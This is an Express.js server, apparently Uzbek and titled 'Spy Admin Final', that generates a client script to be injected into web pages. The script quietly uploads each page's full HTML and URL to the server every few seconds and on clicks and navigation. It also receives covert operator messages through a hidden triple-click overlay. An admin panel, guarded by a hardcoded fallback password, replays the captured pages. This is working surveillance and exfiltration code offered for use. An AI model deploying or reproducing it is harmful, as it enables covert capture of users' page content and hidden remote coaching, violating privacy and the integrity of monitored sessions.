const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
// Renderda "Environment Variable" sifatida ADMIN_PASSWORD qo'shishingiz mumkin
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "8908"; 
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA (Server o'chib yonsa bular tozalanadi) ---
let capturedPages = []; 
let chatHistory = ""; 
let clientFullText = ""; 
let lastUpdateID = 0;

const getUzTime = () => new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });

// Adminni tekshirish funksiyasi
const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) next();
    else res.redirect("/login");
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js) - Dinamik generatsiya
// ========================================================
app.get("/f1.js", (req, res) => {
    // Server manzilini avtomatik aniqlash (Render-da xatosiz ishlash uchun)
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const host = req.get('host');
    const BASE_URL = `${protocol}://${host}`;

    const clientScript = `
(function(){
  const BASE = '${BASE_URL}'; 
  let lastSince=0, msgBox=null, statusBox=null, clickCount=0;
  let currentUrl = window.location.href;
  let lastSentHtml = ""; 
  let isBoxOpen = false; 
  let isFirstRun = true; 

  function showStatus(text, color) {
    if(!statusBox) {
        statusBox = document.createElement('div');
        Object.assign(statusBox.style, {
            position: 'fixed', bottom: '50px', left: '50%', transform: 'translateX(-50%)',
            padding: '5px 15px', borderRadius: '20px',
            background: color || 'rgba(0,128,0,0.8)',
            color: '#fff', fontSize: '12px', fontFamily: 'sans-serif',
            zIndex: 2147483647, pointerEvents: 'none',
            display: 'block', boxShadow: '0 2px 10px rgba(0,0,0,0.3)'
        });
        document.body.appendChild(statusBox);
    }
    statusBox.innerText = text;
    statusBox.style.display = 'block';
    setTimeout(() => { if(statusBox) statusBox.style.display = 'none'; }, 3000);
  }

  function makeMsgBox(){
    if(msgBox) return msgBox;
    msgBox = document.createElement('div');
    Object.assign(msgBox.style,{
      position:'fixed', left:'10px', bottom:'10px', width:'300px', height:'30px',               
      lineHeight:'30px', background:'rgba(0, 0, 0, 0.85)', color:'#00ff00',            
      padding:'0 10px', fontSize:'13px', fontFamily:'monospace', borderRadius:'5px',
      zIndex:2147483647, display:'none', border:'none', boxShadow: '0 4px 10px rgba(0,0,0,0.5)',
      whiteSpace: 'nowrap', overflowX: 'auto', overflowY: 'hidden'         
    });
    const style = document.createElement('style');
    style.innerHTML = "::-webkit-scrollbar{height:0px;width:0px;background:transparent}";
    document.head.appendChild(style);
    document.body.appendChild(msgBox);
    return msgBox;
  }

  async function sendPage(force = false){
    try{
      const currentHtml = document.documentElement.outerHTML;
      const url = window.location.href;
      if (!force && url === currentUrl && Math.abs(currentHtml.length - lastSentHtml.length) < 100) return;

      if(isFirstRun) showStatus("Ulanmoqda...", "#f59e0b");
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({ html: currentHtml, url: url })
      });
      lastSentHtml = currentHtml;
      currentUrl = url;
      if(isFirstRun) { showStatus("Bog'landi ✅", "#10b981"); isFirstRun = false; }
    }catch(e){}
  }

  async function fetchLatest(){
    try{
      const r = await fetch(BASE+'/latest?since='+lastSince);
      const j = await r.json();
      if(j.success && j.fullText){
        const b = makeMsgBox();
        b.innerText = j.fullText; 
        if(j.timestamp > lastSince) {
             if(isBoxOpen) setTimeout(()=> b.scrollLeft = b.scrollWidth, 100);
        }
        lastSince = j.timestamp;
      }
    }catch(e){}
  }

  const originalPushState = history.pushState;
  history.pushState = function() { originalPushState.apply(this, arguments); setTimeout(() => sendPage(true), 500); };
  window.addEventListener('popstate', () => { setTimeout(() => sendPage(true), 500); });
  
  // URL o'zgarganini tekshirish
  setInterval(()=>{ if(currentUrl !== window.location.href) sendPage(true); }, 1500);

  // --- YANGI QO'SHILGAN QISM: Har 8 soniyada avtomatik yuborish ---
  setInterval(() => { sendPage(true); }, 8000); 
  // -----------------------------------------------------------

  document.addEventListener('click', (e) => {
      if(e.button === 0) {
        clickCount++;
        setTimeout(() => clickCount = 0, 500);
        if(clickCount >= 3) {
            clickCount = 0;
            const b = makeMsgBox();
            isBoxOpen = !isBoxOpen;
            b.style.display = isBoxOpen ? 'block' : 'none';
            if(isBoxOpen) setTimeout(()=> b.scrollLeft = b.scrollWidth, 100);
            return;
        }
        setTimeout(() => { sendPage(false); }, 2000);
      }
  });

  sendPage(true);
  setInterval(fetchLatest, 3000);
})();
    `;
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// ========================================================
// 🛣 ROUTES
// ========================================================

// LOGIN
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`
        <body style="background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;">
            <form action="/login" method="POST">
                <h2 style="color:#fff;text-align:center">ADMIN PANEL</h2>
                <input type="password" name="password" style="background:#1e293b;border:1px solid #334155;color:#fff;padding:15px;text-align:center;border-radius:10px;font-size:18px;outline:none" placeholder="PAROL" autofocus>
            </form>
        </body>`);
});

app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true, sameSite: 'lax' });
        res.redirect("/");
    } else res.redirect("/login");
});

app.get("/logout", (req, res) => { res.clearCookie("admin_token"); res.redirect("/login"); });

// API
app.get("/api/pages", checkAuth, (req, res) => {
    res.json(capturedPages.map((p, index) => ({ id: index, url: p.url, date: p.date })).reverse());
});

// DASHBOARD
app.get("/", checkAuth, (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Spy Admin Final</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0f172a; color: #e2e8f0; font-family: sans-serif; margin: 0; padding: 0; }
                .container { max-width: 800px; margin: 20px auto; padding: 0 15px; }
                .chat-container { background: #1e293b; border-radius: 10px; border: 1px solid #334155; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); text-align: center;}
                .chat-history { background: #0f172a; height: 150px; border-radius: 8px; padding: 10px; overflow-y: auto; border: 1px solid #334155; font-family: monospace; font-size: 13px; color: #4ade80; text-align: left; white-space: pre-wrap; margin-bottom: 15px; }
                .input-group { display: flex; gap: 10px; }
                input { flex: 1; padding: 10px; background: #0f172a; border: 1px solid #475569; border-radius: 6px; color: #fff; }
                button { padding: 10px 20px; border-radius: 6px; border: none; cursor: pointer; font-weight: bold; }
                .btn-send { background: #3b82f6; color: white; }
                .btn-clear { background: #ef4444; color: white; font-size: 11px; margin-top: 5px; width: 100%;}
                .pages-container { margin-top: 20px; background: #1e293b; border-radius: 10px; border: 1px solid #334155; padding: 15px; }
                .page-item { display: flex; justify-content: space-between; align-items: center; background: #0f172a; padding: 10px; margin-bottom: 5px; border-radius: 6px; border: 1px solid #334155; }
                .page-url { font-size: 12px; color: #38bdf8; text-decoration: none; overflow: hidden; text-overflow: ellipsis; max-width: 60%; white-space: nowrap; }
                .btn-view { background: #10b981; color: white; text-decoration: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:12px">
                    <span>Admin Panel</span> <a href="/logout" style="color:#ef4444">Chiqish</a>
                </div>
                <div class="chat-container">
                    <div class="chat-history">${chatHistory || "--- Chat bo'sh ---"}</div>
                    <form action="/set-message" method="POST" class="input-group">
                        <input type="text" name="msg" placeholder="Xabar..." autocomplete="off" autofocus>
                        <button class="btn-send">YUBORISH</button>
                    </form>
                    <form action="/clear-history" method="POST"><button class="btn-clear">Chatni Tozalash</button></form>
                </div>
                <div class="pages-container">
                    <div style="display:flex;justify-content:space-between;margin-bottom:10px">
                        <b>Kelgan Sahifalar</b>
                        <form action="/clear-pages" method="POST" style="margin:0"><button style="background:none;color:#ef4444;border:none;cursor:pointer">O'chirish</button></form>
                    </div>
                    <div id="pages-list" style="text-align:center;font-size:12px;color:#64748b">Yuklanmoqda...</div>
                </div>
            </div>
            <script>
                function loadPages() {
                    fetch('/api/pages').then(r=>r.json()).then(d=>{
                        const c = document.getElementById('pages-list');
                        if(!d.length) { c.innerHTML='Ma\\'lumot yo\\'q'; return; }
                        c.innerHTML = d.map(p => \`
                            <div class="page-item">
                                <div><b style="color:#94a3b8">#\${p.id+1}</b> <span style="font-size:10px;color:#64748b">\${p.date}</span></div>
                                <a href="\${p.url}" target="_blank" class="page-url">\${p.url}</a>
                                <a href="/view-site/\${p.id}" target="_blank" class="btn-view">OCHISH</a>
                            </div>\`).join('');
                    });
                }
                setInterval(loadPages, 3000);
                loadPages();
            </script>
        </body>
        </html>
    `);
});

// Captured sahifani ko'rish
app.get("/view-site/:id", checkAuth, (req, res) => {
    const p = capturedPages[req.params.id];
    if (p) {
        // Base href qo'shish, rasmlar va stillar asl saytdan yuklanishi uchun
        const modifiedHtml = p.html.replace("<head>", `<head><base href="${p.url}">`);
        res.send(modifiedHtml);
    } else res.send("Topilmadi");
});

// Clientdan HTML qabul qilish
app.post("/upload-html", (req, res) => {
    const { url, html } = req.body;
    if(url && html) {
        capturedPages.push({ url, html, date: getUzTime() });
        if(capturedPages.length > 50) capturedPages.shift(); // Oxirgi 50 ta sahifani saqlash
    }
    res.json({status:"ok"});
});

// Xabar yuborish
app.post("/set-message", checkAuth, (req, res) => {
    const msg = req.body.msg;
    if(msg) {
        chatHistory += `[${getUzTime().split(' ')[1]}] ${msg}\n`;
        clientFullText = clientFullText === "" ? msg : clientFullText + " | " + msg;
        lastUpdateID = Date.now();
    }
    res.redirect("/");
});

app.post("/clear-history", checkAuth, (req, res) => { chatHistory = ""; clientFullText = ""; lastUpdateID = Date.now(); res.redirect("/"); });
app.post("/clear-pages", checkAuth, (req, res) => { capturedPages = []; res.redirect("/"); });

// Client uchun oxirgi xabarni olish
app.get("/latest", (req, res) => {
    res.json({ success: true, fullText: clientFullText, timestamp: lastUpdateID });
});

// SERVERNI ISHGA TUSHIRISH
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server ishladi: PORT ${PORT}`));
